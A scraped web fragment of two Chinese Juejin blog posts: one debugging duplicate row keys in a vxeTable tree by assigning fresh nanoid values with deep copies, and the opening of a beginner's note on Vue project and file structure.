28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">一、背景</h2>
<p>在使用vxeTable中，遇到了一直提示key重复问题，通过一系列排查，找到了问题所在，特此记录。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d7de0beee464f0b9b389ef9f83a5232~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgelJlYWRvbmx5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510506&amp;x-signature=2IHokQ3EWeS6x7hOW2NEj9mjaRY%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">二、遇到的问题</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d35d6e9e3f6d434fbd704da21fc0fdd3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgelJlYWRvbmx5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510506&amp;x-signature=08OZhHuhvuzOXfoBQME%2BRiTWitM%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-js" lang="js">&lt;<span class="hljs-title class_">StyleProvider</span> hash-priority=<span class="hljs-string">"high"</span> :transformers=<span class="hljs-string">"[legacyLogicalPropertiesTransformer]"</span>&gt;
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">AppProvider</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">RouterView</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-layout"</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">AppProvider</span>&gt;</span></span>
&lt;/<span class="hljs-title class_">StyleProvider</span>&gt;
</code></pre>
<h4 data-id="heading-2">之前使用vxetable由于后端传来的数组对象是平级，翻阅文档发现transform设置可以直接在内部转化，可以不用自己处理数据。后面发现我定义的rowConfig.keyField使用的是gzdcode字段(后端说是主键)，导致id重复表格显示异常。便进行了一层处理，改用lid+gzdcode。</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5555baf650504076bb90259933397d3d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgelJlYWRvbmx5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510506&amp;x-signature=zC7t%2BlOzUHChzr6h2hm9jSzmdoc%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-3">此次解决过后，验证出问题的数据之后，匆忙上了生产，后续我无意操作此处的树状结构发现还存在问题，于是我便重新思考解决。</h4>
<h3 data-id="heading-4">找出问题所在</h3>
<h4 data-id="heading-5">首先我将原始数据进行打印，并且在控制台进行搜索重复的uniqueId值，结果我发现，出现error的几个值并没有发现重复，我就觉得纳闷，就去GitHub上希望可以寻找答案。转了一圈发现issue并没有人提出类似的问题。后面想到了使用xe-utils自带的toArrayTree转换成树状，并且去除组件的transform发现有同样的问题。</h4>
<h4 data-id="heading-6">后面将转换后的数据在控制台进行搜索重复的uniqueId值，同样没有重复数据，那到底哪里重复了？后面想到复制到json文档中进行搜索，还真让我发现了重复的两条数据。</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/86ecf4959b25445193ae085fc321140e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgelJlYWRvbmx5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510506&amp;x-signature=Sa%2F%2FfqN24h%2BAMIkmY7QhRwbMNUs%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-7">同样的一条数据，因为他们的父级id相同（但是父级的uniqueId不同），导致同一条数据插入到了两条流向下面（一正一负），我当时就想拿数据找后端对峙，后面想到了之前后端的种种劣迹，还是自己想办法解决。</h4>
<h3 data-id="heading-8">解决办法</h3>
<h4 data-id="heading-9">如果是同一条数据分别插入到两个父级元素，那肯定数据自带的字段生成uuid这个方法肯定不行。而且哪怕后端跟我生成了一个主键也并没有用。vxeTable内部自带的平级转树状肯定也是没用的。</h4>
<h4 data-id="heading-10">我应该使用vxeTable自带的toArrayTree方法进行转层级结构，并且转化完之后递归给每个item生成uuid，代码如下：</h4>
<pre><code class="hljs language-js" lang="js">tableDetailList.<span class="hljs-property">value</span> = <span class="hljs-title function_">addUniqueId</span>(<span class="hljs-title function_">toArrayTree</span>(<span class="hljs-title function_">cloneDeep</span>(data), { <span class="hljs-attr">key</span>: <span class="hljs-string">'id'</span>, <span class="hljs-attr">parentKey</span>: <span class="hljs-string">'parentID'</span> }));
<span class="hljs-keyword">function</span> <span class="hljs-title function_">addUniqueId</span>(<span class="hljs-params">data: any[]</span>) {
  <span class="hljs-keyword">if</span> (!data) <span class="hljs-keyword">return</span> [];
  <span class="hljs-keyword">return</span> data.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
    item.<span class="hljs-property">uniqueId</span> = <span class="hljs-title function_">nanoid</span>();
    <span class="hljs-keyword">if</span> (item.<span class="hljs-property">children</span> &amp;&amp; item.<span class="hljs-property">children</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      item.<span class="hljs-property">children</span> = <span class="hljs-title function_">addUniqueId</span>(item.<span class="hljs-property">children</span>);
    }
    <span class="hljs-keyword">return</span> item;
  });
}
</code></pre>
<h3 data-id="heading-11">后续</h3>
<h4 data-id="heading-12">完事过后，我发现还是提示显示重复的主键提示，百思不得其解，我开始审视我的代码，并且debugger调试。终终终终终终终终于让我发现问题，toArrayTree方法应该没有将重复主键的children中的item进行深拷贝，导致之前重复数据引用地址一样，导致uniqueId赋值时候，实际上改了不同父级的同一数据，果然AI写的代码没有那么靠谱（必须有人背锅）。 所以我在addUniqueId方法中return item加一个深拷贝。</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">addUniqueId</span>(<span class="hljs-params">data: any[]</span>) {
  <span class="hljs-keyword">if</span> (!data) <span class="hljs-keyword">return</span> [];
  <span class="hljs-keyword">return</span> data.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
    item.<span class="hljs-property">uniqueId</span> = <span class="hljs-title function_">nanoid</span>();
    <span class="hljs-keyword">if</span> (item.<span class="hljs-property">children</span> &amp;&amp; item.<span class="hljs-property">children</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      item.<span class="hljs-property">children</span> = <span class="hljs-title function_">addUniqueId</span>(item.<span class="hljs-property">children</span>);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">cloneDeep</span>(item);
  });
}
</code></pre>
<h4 data-id="heading-13">终于问题解决。</h4></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue学习笔记-项目结构与文件结构分析]]></title>    <link>https://juejin.cn/post/7579892134816890915</link>    <guid>https://juejin.cn/post/7579892134816890915</guid>    <pubDate>2025-12-05T03:37:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579892134816890915" data-draft-id="7579892222609195043" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue学习笔记-项目结构与文件结构分析"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-05T03:37:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户55597002510"/> <meta itemprop="url" content="https://juejin.cn/user/2051012520061929"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue学习笔记-项目结构与文件结构分析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2051012520061929/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户55597002510
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:37:36.000Z" title="Fri Dec 05 2025 03:37:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><pre><code class="hljs">📝 作者：一名 Vue 的学习者
🕒 记录时间：2025年12月
💡 目标：熟悉Vue项目结构及.vue文件结构
</code></pre>
<h2 data-id="heading-0">一、Vue项目结构</h2>
<p>在使用 <code>npm create vue@latest my-vue-app </code>命令创建最简单的vue项目后，目录文件结构如下：</p>
<pre><code class="hljs language-css" lang="css">my-vue-app/
└─ <span class="hljs-attribute">src</span>/
   ├─ assets/
   ├─ components/
   └─ router/
      └─ index<span class="hljs-selector-class">.js</span>
   ├─ views/
   ├─ <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.js</span>
   ├─ App<span class="hljs-selector-class">.vue</span>
├─ index<span class="hljs-selector-class">.html</span>
├─ package<span class="hljs-selector-class">.json</span>
├─ vite<span class="hljs-selector-class">.config</span><span class="hljs-selector-class">.js</span>
</code></pre>
<h2 data-id="heading-1">二、项目文件详解</h2>
<h3 data-id="heading-2">1、 <code>index.html</code>（页面壳子，挂载点）</h3>
<p>默认脚手架有 <code>index.html</code>。确保其中有挂载点 <code>&lt;div id="app"&gt;&lt;/div&gt;</code> 并且引入了 <code>src/main.js</code>：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>My Vue App<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/src/main.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
